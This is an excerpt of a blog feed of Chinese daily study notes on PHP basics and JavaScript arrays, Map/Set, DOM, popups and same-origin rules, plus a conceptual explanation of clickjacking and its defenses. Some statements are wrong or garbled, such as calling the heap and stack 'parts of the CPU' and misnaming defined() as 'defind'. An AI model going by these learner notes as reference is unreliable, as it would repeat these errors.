        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="开始学习PHP"><a href="#开始学习PHP" class="headerlink" title="开始学习PHP"></a>开始学习PHP</h5><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>PHP是超文本预处理器<br>运行在服务器端，内嵌在html脚本语言<br>由wampserver等集成环境，有mysql数据库和apache服务<br>使用localhost或127.0.0.1访问<br>写入的php文件一定要放在www目录下</p><h4 id="php信息"><a href="#php信息" class="headerlink" title="php信息"></a>php信息</h4><p>phpinfo();显示所有php的信息<br>php.ini配置文件</p><h4 id="PHP文件格式"><a href="#PHP文件格式" class="headerlink" title="PHP文件格式"></a>PHP文件格式</h4><pre><code>&lt;?php              //大小写都可以代码部分除最后一行以外每行结尾都要以;结尾?&gt;可以不写php但是要改ini配置文件的short_open_tag=On,要重启</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>$变量名(不能是数字或特殊符号开头，可以是中文，建议驼峰命名法)=’value’;<br>echo “$变量名”;        //输出上面传入的值</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><pre><code>单引号:如果里面有变量都作为一个字符串处理双引号:里面有变量会输出变量的值尽量使用单引号————效率高//单行注释/* */多行注释&quot;\n&quot;换行(双引号解释转义字符，单引号不解释)\r和\t同上&#39;\\&#39;时输出\&#39;\&#39;&#39;时输出&#39;因为\将后面的转义成没意义的字符变量和字符串之间用.连接，而且要&#39;将字符串包起来双引号中插入单引号，单引号再插入变量时，变量会解析成&#39;value&#39;双引号中插入变量时在变量后面加空格或,echo __FILE__;输出文件地址echo __LINE__;输出行号echo __DIR__;输出当前文件的文件夹的路径echo PHP_VERSION;获取php版本号echo __FUNCTION__;输出函数名false的情况:空字符串，0，空数组，null</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>&lt;分类&gt;标量    浮点类型:float    整数型:int    布尔型:boolean    字符串:string(只要是引号包起来的)混合类型    数组:array    对象:object特殊类型    空:null     资源:resourse    &lt;转换&gt;intval()转整形floatval()转浮点型strval()转字符串boolval()转布尔型&lt;注&gt;空转整形为0空转浮点型变成浮点型的0空转字符串变成空字符串整形后面有字符串会清除字符串保留前面的数字浮点型后面有字符串会清除字符串保留前面的全部数字&lt;判断&gt;is_array();is_string()is_bool();is_float();is_int();is_object();is_numeric();is_resource();is_null();is_scalar();判断标量gettype();只获取类型var_dump();输出值和类型PHP中提供四种整形的定义方式，十进制定义，二进制定义，八进制定义和十六进制定义$a = 120 //十进制$a = 0b110 //二进制$a = 0120     //八进制$a = 0x120    //十六进制// 使用echo输出时。默认输出为十进制decbin() // 十进制转二进制decoct() // 十进制转八进制dechex() // 十进制转十六进制bindec() // 二进制转十进制bin2hex() //二进制转十六进制    字符串：字符串变量用于存储并处理文本。</code></pre><h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><p>定义:<br>define(‘常量名字’,’常量值————必须是常量’);<br>变量可重新定义，使用的变量必须在上面定义<br>defind(A);判断A是否已经被定义了</p><pre><code>使用 define() 函数设置常量:bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )　　该函数有三个参数:name：必选参数，常量名称，即标志符。value：必选参数，常量的值。case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。&lt;?php // 常量define(&quot;CL&quot;, &quot;这是一个全局常量&quot;, true);echo CL; // 默认false，变量名区分大小写echo cl; // true不区分大小写?&gt;预定义常量PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。（4）PHP_OS: PHP所在的操作系统的类型。如Linux。（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</code></pre><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><pre><code>算术运算符:+   -   *   /   %赋值运算符:=   +=   -=   /+   %=   .=自增自减运算符:++   --   比较运算符:&lt;   &gt;   &gt;=   &lt;=   ==   ===   !=(仅看值)   !==(看值和数据类型)   &lt;&gt;(相当于!=)逻辑运算符:&amp;&amp;   ||   !(真假反转)静态变量:static 放在函数体内，只会初始化一次变量，以后运行会记录上一次的值预递增++x         //先加再返回预递减--x         //先减再返回后递增x++         //先返回再加后递减x--         //先返回再减非!               //不是true就返回true或or/||           //一个true就true与and/&amp;&amp;          //都true才true异或xor           //有且仅有一个true才是true三元运算符:(expr1) ? (expr2) : (expr3)</code></pre><h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><pre><code>&lt;单分支&gt;if (条件) &#123;         //真区间;&#125; else &#123;         //假区间;&#125;后续代码;&lt;多分支&gt;switch (条件) &#123;    case 判断条件1 :    case 判断条件2 :    case 判断条件3 :        echo 执行1 ;        break;    case 判断条件4 :        echo 执行2 ;        break;    default:        echo 执行3 ;      //否则        break;&#125;if (条件判断1) &#123;    echo 执行1 ;&#125; else if (条件判断2) &#123;    echo 执行2 ;&#125; else if (条件判断3) &#123;    echo 执行3 ;&#125; else &#123;    echo 执行4 ;&#125;</code></pre><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><pre><code>for (初始条件;条件判断;执行A) &#123;       //程序进行从初始条件开始逆时针    echo 执行B ;&#125;——————————————————————————————————————————————————————————————————————————————while (条件判断) &#123;    echo 执行 ;&#125;——————————————————————————————————————————————————————————————————————————————do &#123;    echo 执行 ;&#125; while (条件判断);     //成立才接着循环——————————————————————————————————————————————————————————————————————————————continue从下一次循环语句开始break终止循环语句</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><pre><code>function 函数名 (设置参数$...=...) &#123;    echo 执行;    return 1;       //只返回不输出&#125;函数名 ();上面这样return的1是不会输出的，要输出就要在调用函数前echo函数可以在任何位置调用，但是变量不能在上面调用函数可以调用多次函数体内声明的变量是局部变量，否则是全局变量两者互不污染，同时局部变量与垃圾回收机制有关$_GET $_POST $_COOKIE $_SESSION $GLOBALS  超全局变量(统一内外变量)约束形参:function sum (int $num1 , int $num2)&#123;    return $num1 + $num2;&#125;(sum(&#39;2.3&#39;,3));约束返回值:function sum (int $num1 , int $num2):string&#123;    return $num1 + $num2;&#125;(sum(4,5));php7.0新特性:使用  ...$函数名  来将数组里的值一一给形参赋值匿名函数:将一个没有函数名的函数赋值给一个变量并调用(就是没有名字的函数)static的关键字的使用: * 当一个函数完成时，它的所有变量通常都会被删除。 * 然而，有时候您希望某个局部变量不要被删除。 * 要做到这一点，请在您第一次声明变量时使用 static 关键字：function test()&#123;    static $n=0;    $n++;    echo &quot;调用了一次&quot;.$n.&quot;\n&quot;;&#125;test();test();test();?&gt;</code></pre><h4 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h4><p>PHP 有三种不同的变量作用域：<br>local（局部）:函数内部声明的变量只能在函数内部进行访问<br>global（全局）:函数之外声明的变量只能在函数以外进行访问<br>static（静态）:静态变量仅在局部函数域中存在，当函数执行离开此作用域时，其值不会消失(例如拿来判断循环退出的变量)<br>内部函数想要引用外部变量可以引入global关键字global $outer;<br>注释：static变量仍然是函数的局部变量</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>查手册</p><h4 id="书写建议"><a href="#书写建议" class="headerlink" title="书写建议"></a>书写建议</h4><p>能加空格就加</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"><a href="#幸运的人一生被童年治愈，不幸的人用一生治愈童年。" class="headerlink" title="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"></a>幸运的人一生被童年治愈，不幸的人用一生治愈童年。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221109</title>
      <link href="/2022/11/09/20221109/"/>
      <url>/2022/11/09/20221109/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>递归:调用函数时调用自身<br>最大的嵌套调用次数（包括首次）被称为 递归深度。</p><p>两种思考方式:<br>1.迭代思路：使用 for 循环<br>2.递归思路：简化任务，调用自身</p><h4 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h4><p>堆和栈是cpu的两个部分，栈用于存储数据，堆<br>遵守先入后出原则，存入数据是压栈，放出数据叫弹栈POP(内存的数据不删除，但是放入回收站)<br>如果只入不出(没有return)就会栈溢出，导致程序错误<br>执行上下文和堆栈:<br>执行上下文是一个内部数据结构，它包含有关函数执行时的详细细节：当前控制流所在的位置，当前的变量，this 的值（此处我们不使用它），以及其它的一些内部细节。<br>一个函数调用仅具有一个与其相关联的执行上下文。</p><p>函数进行嵌套调用时:</p><pre><code>当前函数被暂停；1.与它关联的执行上下文被一个叫做 执行上下文堆栈 的特殊数据结构保存；2.执行嵌套调用；3.嵌套调用结束后，从堆栈中恢复之前的执行上下文，并从停止的位置恢复外部函数。</code></pre><h4 id="Rest-参数与-Spread-语法"><a href="#Rest-参数与-Spread-语法" class="headerlink" title="Rest 参数与 Spread 语法"></a>Rest 参数与 Spread 语法</h4><p>当我们在代码中看到 “…” 时，它要么是 rest 参数，要么是 spread 语法。<br>有一个简单的方法可以区分它们：<br>若 … 出现在函数参数列表的最后，那么它就是 rest 参数，它会把参数列表中剩余的参数收集到一个数组中。<br>若 … 出现在函数调用或类似的表达式中，那它就是 spread 语法，它会把一个数组展开为列表。<br>使用场景：<br>Rest 参数用于创建可接受任意数量参数的函数。<br>Spread 语法用于将数组传递给通常需要含有许多参数的函数。<br>我们可以使用这两种语法轻松地互相转换列表与参数数组。<br>旧式的 arguments（类数组且可迭代的对象）也依然能够帮助我们获取函数调用中的所有参数。</p><h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><p>通常，函数调用完成后，会将词法环境和其中的所有变量从内存中删除。因为现在没有任何对它们的引用了。与 JavaScript 中的任何其他对象一样，词法环境仅在可达时才会被保留在内存中。<br>但是，如果有一个嵌套的函数在函数结束后仍可达，则它将具有引用词法环境的[[Environment]] 属性。<br>如果在（外部）函数执行完成后，它的词法环境仍然可达。因此，此词法环境仍然有效。<br>若要删除则需要令词法环境对象变得不可达</p><h4 id="属性标志"><a href="#属性标志" class="headerlink" title="属性标志"></a>属性标志</h4><p>value<br>writable — 如果为 true，则值可以被修改，否则它是只可读的。<br>enumerable — 如果为 true，则会被在循环中列出，否则不会被列出。<br>configurable — 如果为 true，则此属性可以被删除，这些特性也可以被修改，否则不可以。</p><h4 id="浏览器环境，规格"><a href="#浏览器环境，规格" class="headerlink" title="浏览器环境，规格"></a>浏览器环境，规格</h4><p>能运行 JavaScript 的平台称为主机环境<br>包含DOM，BOM，JavaScript</p><pre><code>文档对象模型（DOM）将所有页面内容表示为可以修改的对象浏览器对象模型（BOM）表示由浏览器（主机环境）提供的用于处理文档（document）之外的所有内容的其他对象  例如:      navigator 对象提供了有关浏览器和操作系统的背景信息          navigator.userAgent —— 关于当前浏览器          navigator.platform —— 关于平台（有助于区分 Windows/Linux/Mac 等）      location 对象允许我们读取当前 URL，并且可以将浏览器重定向到新的 URL</code></pre><h4 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h4><p>概念:<br>DOM 将 HTML 表示为标签的树形结构。<br>每个树的节点都是一个对象。<br>标签被称为 元素节点（或者仅仅是元素），元素内的文本形成 文本节点，被标记为 ＃text。一个文本节点只包含一个字符串。它没有子项，并且总是树的叶子。</p><p>自动修正:<br>浏览器遇到格式不正确的 HTML，它会在形成 DOM 时自动更正它。</p><p>浏览器开发工具元素（Elements）选项卡:<br>Styles —— 我们可以看到按规则应用于当前元素的 CSS 规则，包括内建规则（灰色）。几乎所有内容都可以就地编辑，包括下面的方框的 dimension/margin/padding。<br>Computed —— 按属性查看应用于元素的 CSS：对于每个属性，我们可以都可以看到赋予它的规则（包括 CSS 继承等）。<br>Event Listeners —— 查看附加到 DOM 元素的事件侦听器（我们将在本教程的下一部分介绍它们）。</p><p>节点属性:</p><pre><code>每个 DOM 节点都属于一个特定的类。这些类形成层次结构（hierarchy）。完整的属性和方法集是继承的结果。主要的 DOM 节点属性有：nodeType    我们可以使用它来查看节点是文本节点还是元素节点。它具有一个数值型值（numeric value）：1 表示元素，3 表示文本节点，其他一些则代表其他节点类型。只读。nodeName/tagName    用于元素名，标签名（除了 XML 模式，都要大写）。对于非元素节点，nodeName 描述了它是什么。只读。innerHTML    元素的 HTML 内容。可以被修改。outerHTML    元素的完整 HTML。对 elem.outerHTML 的写入操作不会触及 elem 本身。而是在外部上下文中将其替换为新的 HTML。nodeValue/data    非元素节点（文本、注释）的内容。两者几乎一样，我们通常使用 data。可以被修改。textContent    元素内的文本：HTML 减去所有 &lt;tags&gt;。写入文本会将文本放入元素内，所有特殊字符和标签均被视为文本。可以安全地插入用户生成的文本，并防止不必要的 HTML 插入。hidden    当被设置为 true 时，执行与 CSS display:none 相同的事。DOM 节点还具有其他属性，具体有哪些属性则取决于它们的类。例如，&lt;input&gt; 元素（HTMLInputElement）支持 value，type，而 &lt;a&gt; 元素（HTMLAnchorElement）则支持 href 等。大多数标准 HTML 特性（attribute）都具有相应的 DOM 属性。</code></pre><h4 id="弹窗和-window-的方法"><a href="#弹窗和-window-的方法" class="headerlink" title="弹窗和 window 的方法"></a>弹窗和 window 的方法</h4><p>window.open(‘<a href="https://javascript.info/&#39;)%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%BB%99%E5%AE%9A">https://javascript.info/&#39;)打开一个具有给定</a> URL 的新窗口</p><pre><code>阻止弹窗:1.阻止除了用户触发的事件之外的弹窗// 弹窗被阻止window.open(&#39;https://javascript.info&#39;);// 弹窗被允许button.onclick = () =&gt; &#123;  window.open(&#39;https://javascript.info&#39;);&#125;;2.浏览器可以接受不同时间的延迟，超过这个时间则移除“信任”// 1 秒后打开弹窗setTimeout(() =&gt; window.open(&#39;http://google.com&#39;), 1000);</code></pre><h4 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h4><p>打开一个弹窗的语法是 window.open(url, name, params)<br>其中params是width=200,height=100<br>窗口功能<br>menubar（yes/no）—— 显示或隐藏新窗口的浏览器菜单。<br>toolbar（yes/no）—— 显示或隐藏新窗口的浏览器导航栏（后退，前进，重新加载等）。<br>location（yes/no）—— 显示或隐藏新窗口的 URL 字段。Firefox 和 IE 浏览器不允许默认隐藏它。<br>status（yes/no）—— 显示或隐藏状态栏。同样，大多数浏览器都强制显示它。<br>resizable（yes/no）—— 允许禁用新窗口大小调整。不建议使用。<br>scrollbars（yes/no）—— 允许禁用新窗口的滚动条。不建议使用。</p><h4 id="跨窗口通信"><a href="#跨窗口通信" class="headerlink" title="跨窗口通信"></a>跨窗口通信</h4><p>“同源（Same Origin）”策略(保护用户免遭信息盗窃)限制了窗口（window）和 frame 之间的相互访问。<br>如果两个 URL 具有相同的协议，域和端口，则称它们是“同源”的。<br>“同源”策略规定：<br>1.如果我们有对另外一个窗口的引用，并且该窗口是同源的，那么我们就具有对该窗口的全部访问权限。<br>2.否则，就无法访问该窗口中的任何东西。唯一的例外是 location：我们可以修改它（进而重定向用户）。但是我们无法读取 location（因此，我们无法看到用户当前所处的位置，也就不会泄漏任何信息）。</p><h4 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h4><p>原理:<br>1.访问者被恶意页面吸引<br>2.页面上有一个看起来无害的链接<br>3.放置了一个透明的iframe标签，通常通过 z-index 实现的<br>点击劫持是对点击事件，而非键盘事件<br>防御:<br>1.阻止因更改 beforeunload 事件处理程序中的 top.location 而引起的过渡————当 iframe 试图更改 top.location 时，访问者会收到一条消息，询问他们是否要离开页面<br>2.利用Sandbox 特性，添加sandbox=”allow-scripts allow-forms” 的 iframe。允许脚本和表单。但没有 allow-top-navigation，因此禁止更改 top.location 。<br>3.服务器端 header X-Frame-Options 可以允许或禁止在 frame 中显示页面。(副作用大)<br>4.具有 samesite 特性的 cookie 仅在网站是通过直接方式打开（而不是通过 frame 或其他方式）的情况下才发送到网站。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="落月随山隐，"><a href="#落月随山隐，" class="headerlink" title="落月随山隐，"></a>落月随山隐，</h5><h5 id="山随月落隐。"><a href="#山随月落隐。" class="headerlink" title="山随月落隐。"></a>山随月落隐。</h5><h5 id="月落山随隐，"><a href="#月落山随隐，" class="headerlink" title="月落山随隐，"></a>月落山随隐，</h5><h5 id="随月落山隐。"><a href="#随月落山隐。" class="headerlink" title="随月落山隐。"></a>随月落山隐。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221108</title>
      <link href="/2022/11/08/20221108/"/>
      <url>/2022/11/08/20221108/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组（Array）能存储有序的集合</p><p>声明:</p><pre><code>let arr = new Array();let fruits = [&quot;Apple&quot;, &quot;Orange&quot;, &quot;Plum&quot;];重新定义就能更改value增加array只需要定义新位置fruits.length是元素的个数以逗号结尾</code></pre><p>查找:<br>fruits[fruits.length - 1]&lt;因为方括号中的索引是被按照其字面意思处理的&gt;<br>fruits.at(-1)<br>不能用fruits[-1]查找元素,结果是 undefined</p><p>更改:<br>push 在末端添加一个元素<br>pop 从末端取出并删除一个元素<br>unshift 在数组的首端添加元素<br>shift 取出队列首端的一个元素，整个队列往前移，这样原先排第二的元素现在排在了第一个<br>(push 和 unshift 方法都可以一次添加多个元素)<br>push/pop 方法运行的比较快，而 shift/unshift 比较慢</p><p>slice:<br>arr.slice([start], [end])<br>返回一个新数组，将所有从索引 start 到 end（不包括 end）的数组项复制到一个新的数组。start 和 end 都可以是负数，在这种情况下，从末尾计算索引</p><p>splice:<br>arr.splice(start[, deleteCount, elem1, …, elemN])<br>从索引 start 开始修改 arr：删除 deleteCount 个元素并在当前位置插入 elem1, …, elemN。最后返回被删除的元素所组成的数组</p><p>concat:<br>arr.concat(arg1, arg2…)<br>创建一个包含来自于 arr，然后是 arg1，arg2 的元素的新数组。<br>如果参数 argN 是一个数组，那么其中的所有元素都会被复制。否则，将复制参数本身。<br>如果类数组对象具有 Symbol.isConcatSpreadable 属性，那么它的元素就会被添加</p><p>遍历:<br>for..of 不能获取当前元素的索引，只是获取元素值<br>for..in 会遍历所有属性，不仅仅是数字属性，而且不适用于数组，因此速度要慢<br>forEach 允许为数组的每个元素都运行一个函数</p><p>关于 “length”:<br>不是数组里元素的个数，而是最大的数字索引值加一<br>通过减少length来截断数组，但length恢复后数组不会恢复<br>清空数组最简单的方法就是：arr.length = 0;</p><p>new Array():<br>创建一个指定了长度，却没有任何项的数组</p><p>多维数组:<br>matrix[1][1]最中间的那个数</p><p>toString:<br>返回以逗号隔开的元素列表</p><p>使用 == 比较数组:<br>1.仅当两个对象引用的是同一个对象时，它们才相等 ==<br>2.如果 == 左右两个参数之中有一个参数是对象，另一个参数是原始类型，那么该对象将会被转换为原始类型<br>3.……null 和 undefined 相等 ==，且各自不等于任何其他的值</p><p>在数组中搜索:<br>arr.indexOf(item, from);<br>从索引 from 开始搜索 item，如果找到则返回索引，否则返回 -1。<br>arr.includes(item, from);<br>从索引 from 开始搜索 item，如果找到则返回 true（没找到则返回 false）。<br>alert( fruits.lastIndexOf(‘Apple’) );<br>与 indexOf 相同，但从右向左查找<br>arr.find(function(item, index, array);<br>item 是元素。index 是它的索引。array 是数组本身。<br>如果返回 true，则返回 item 并停止迭代;对于假值，则返回 undefined<br>arr.filter(function(item, index, array);<br>如果 true item 被 push 到 results，迭代继续;如果什么都没找到，则返回空数组<br>indexOf 和 includes 使用严格相等 === 进行比较。所以，搜索 false时会准确找到 false 而不是数字 0<br>includes可以正确处理 NaN</p><p>转换数组:<br>arr.map(function(item, index, array)<br>对数组的每个元素都调用函数，并返回结果数组<br>arr.sort();<br>默认情况下被按字符串进行排序<br>arr.sort(compareNumeric);<br>按数字进行排序<br>arr.reverse();<br>倒序</p><p>分割粘合数组:<br>let arr = names.split(‘, ‘,2);<br>将字符串分割成一个个数组,限制数组长度为2,额外的元素会被忽略<br>str.split(‘’);<br>将字符串拆分为字母数组<br>arr.join(‘;’);<br>根据;粘合数组</p><p>从数组中区分出普通对象:<br>Array.isArray({})<br>如果 value 是一个数组，则返回 true；否则返回 false。</p><h4 id="Iterable-object（可迭代对象）"><a href="#Iterable-object（可迭代对象）" class="headerlink" title="Iterable object（可迭代对象）"></a>Iterable object（可迭代对象）</h4><p>可以应用 for..of 的对象被称为 可迭代的。<br>技术上来说，可迭代对象必须实现 Symbol.iterator 方法。<br>obj[Symbol.iterator].() 的结果被称为迭代器（iterator）。由它处理进一步的迭代过程。<br>一个迭代器必须有 next() 方法，它返回一个 {done: Boolean, value: any} 对象，这里 done:true 表明迭代结束，否则 value 就是下一个值。<br>Symbol.iterator 方法会被 for..of 自动调用，但我们也可以直接调用它。<br>内建的可迭代对象例如字符串和数组，都实现了 Symbol.iterator。<br>字符串迭代器能够识别代理对。<br>有索引属性和 length 属性的对象被称为 类数组对象。这种对象可能还具有其他属性和方法，但是没有数组的内建方法。<br>如果我们仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是“真正的”数组，因为这样抽象度更高。<br>Array.from(obj[, mapFn, thisArg]) 将可迭代对象或类数组对象 obj 转化为真正的数组 Array，然后我们就可以对它应用数组的方法。可选参数 mapFn 和 thisArg 允许我们将函数应用到每个元素。</p><h4 id="Map-and-Set（映射和集合）"><a href="#Map-and-Set（映射和集合）" class="headerlink" title="Map and Set（映射和集合）"></a>Map and Set（映射和集合）</h4><p>Map 是一个带键的数据项的集合，就像一个 Object 一样。 但是它们最大的差别是 Map 允许任何类型的键（key）。</p><pre><code>Mapnew Map() —— 创建 map。map.set(key, value) —— 根据键存储值。map.get(key) —— 根据键来返回值，如果 map 中不存在对应的 key，则返回 undefined。map.has(key) —— 如果 key 存在则返回 true，否则返回 false。map.delete(key) —— 删除指定键的值。map.clear() —— 清空 map。map.size —— 返回当前元素个数。Map 迭代map.keys() —— 遍历并返回一个包含所有键的可迭代对象，map.values() —— 遍历并返回一个包含所有值的可迭代对象，map.entries() —— 遍历并返回一个包含所有实体 [key, value] 的可迭代对象，for..of 在默认情况下使用的就是这个。</code></pre><p>Object.entries：从对象创建 Map<br>let map = new Map(Object.entries(obj));<br>Object.fromEntries：从 Map 创建对象<br>let obj = Object.fromEntries(map.entries()); // 创建一个普通对象（plain object）(*)</p><pre><code>Setnew Set(iterable) —— 创建一个 set，如果提供了一个 iterable 对象（通常是数组），将会从数组里面复制值到 set 中。set.add(value) —— 添加一个值，返回 set 本身set.delete(value) —— 删除值，如果 value 在这个方法调用的时候存在则返回 true ，否则返回 false。set.has(value) —— 如果 value 在 set 中，返回 true，否则返回 false。set.clear() —— 清空 set。set.size —— 返回元素个数。Set 迭代（iteration）set.keys() —— 遍历并返回一个包含所有值的可迭代对象，set.values() —— 与 set.keys() 作用相同，这是为了兼容 Map，set.entries() —— 遍历并返回一个包含所有的实体 [value, value] 的可迭代对象，它的存在也是为了兼容 Map。</code></pre><h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象与其关联值一同删除。</p><p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象删除。</p><p>它们的主要优点是它们对对象是弱引用，所以被它们引用的对象很容易地被垃圾收集器移除。</p><p>这是以不支持 clear、size、keys、values 等作为代价换来的……</p><p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么该对象将被自动清除。</p><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>JSON 是一种数据格式，具有自己的独立标准和大多数编程语言的库。<br>JSON 支持 object，array，string，number，boolean 和 null。<br>JavaScript 提供序列化（serialize）成 JSON 的方法 JSON.stringify 和解析 JSON 的方法 JSON.parse。<br>这两种方法都支持用于智能读/写的转换函数。<br>如果一个对象具有 toJSON，那么它会被 JSON.stringify 调用。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="今天就想说一句-我这是学js上头了嘛，为啥学这么细……"><a href="#今天就想说一句-我这是学js上头了嘛，为啥学这么细……" class="headerlink" title="今天就想说一句:我这是学js上头了嘛，为啥学这么细……"></a>今天就想说一句:我这是学js上头了嘛，为啥学这么细……</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221107</title>
      <link href="/2022/11/07/20221107/"/>
      <url>/2022/11/07/20221107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="原始类型的方法"><a href="#原始类型的方法" class="headerlink" title="原始类型的方法"></a>原始类型的方法</h4><h5 id="原始类型和对象之间的关键区别。"><a href="#原始类型和对象之间的关键区别。" class="headerlink" title="原始类型和对象之间的关键区别。"></a>原始类型和对象之间的关键区别。</h5><p>一个原始值：<br>是原始类型中的一种值。<br>在 JavaScript 中有 7 种原始类型：string，number，bigint，boolean，symbol，null 和 undefined。<br>一个对象：<br>能够存储多个值作为属性。<br>可以使用大括号 {} 创建对象，例如：{name: “John”, age: 30}。JavaScript 中还有其他种类的对象，例如函数就是对象。<br>原始类型不是对象，它们不能存储额外的数据。</p><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>两种类型:<br>常规数字以 64 位的格式 IEEE-754 存储，也被称为“双精度浮点数”<br>BigInt 用于表示任意长度的整数</p><p>编写数字的方法:<br>let billion = 1e9;           // 10 亿，字面意思：数字 1 后面跟 9 个 0<br>alert( 7.3e9 );              // 73 亿（与 7300000000 和 7_300_000_000 相同）<br>let mcs = 0.000001 = 1e-6;   // 1 的左边有 6 个 0;</p><p>二进制0b  八进制0o  十六进制0x</p><p>toString(base):<br>返回在给定 base 进制数字系统中 num 的字符串表示形式<br>alert( 123456..toString(36) );     // 三十六进制，2n9c</p><p>使用两个点来调用一个方法:<br>123456.toString(36)相当于(123456).toString(36)<br>语法隐含了第一个点之后的部分为小数部分。再放一个点，JS就知道小数部分为空。</p><p>舍入:</p><pre><code>        Math.floor     Math.ceil     Math.round     Math.trunc3.1        3              4             3             33.6        3              4           4           3-1.1       -2             -1            -1            -1-1.6       -2             -1            -2            -1</code></pre><p>Math.floor向下舍入<br>Math.ceil向上舍入<br>Math.round向最近的整数舍入<br>Math.trunc（IE 浏览器不支持这个方法）移除小数点后的所有内容而没有舍入</p><p>舍入到小数点后 n 位:<br>1.将数字乘以 100，调用舍入函数，然后再将其除回<br>2.toFixed(n) 将数字四舍五入到小数点后 n 位，并以字符串形式返回结果</p><p>不精确的计算:<br>数字是以 64 位格式 IEEE-754 表示的:其中 52 位被用于存储这些数字， 11 位用于存储小数点的位置，而 1 位用于符号。<br>1.如果一个数字真的很大，则可能会溢出 64 位存储，变成一个特殊的数值 Infinity<br>2.一个数字以其二进制的形式存储在内存中。但是在十进制数字系统中看起来很简单的 0.1，0.2 这样的小数，实际上在二进制形式中是无限循环小数<br>最可靠的解决方法是借助方法 toFixed(n) 对结果进行舍入</p><p>isFinite 和 isNaN:<br>属于 number 类型，但不是“普通”数字<br>Infinity（和 -Infinity）是一个特殊的数值，比任何数值都大（小）。<br>NaN 代表一个 error。<br>isNaN(value) 将其参数转换为数字，然后测试它是否为 NaN<br>isFinite(value) 将其参数转换为数字，如果是常规数字而不是 NaN/Infinity/-Infinity，则返回 true<br>注:在所有数字函数中，包括 isFinite，空字符串或仅有空格的字符串均被视为 0<br>比较两个值是否完全相同时，它使用Object.is(a,b) === true</p><p>parseInt(str, radix) 和 parseFloat:<br>从字符串中“读取”数字，直到无法读取为止。parseInt 返回一个整数，parseFloat 返回一个浮点数,没有数字可读时为NaN<br>parseInt(str, radix) 的第二个参数为要解析的str的进制,可选</p><p>其他数学函数:<br>Math.random()返回一个从 0 到 1 的随机数（不包括 1）<br>Math.max(a, b, c…)返回最大值<br>Math.pow(n, power)返回 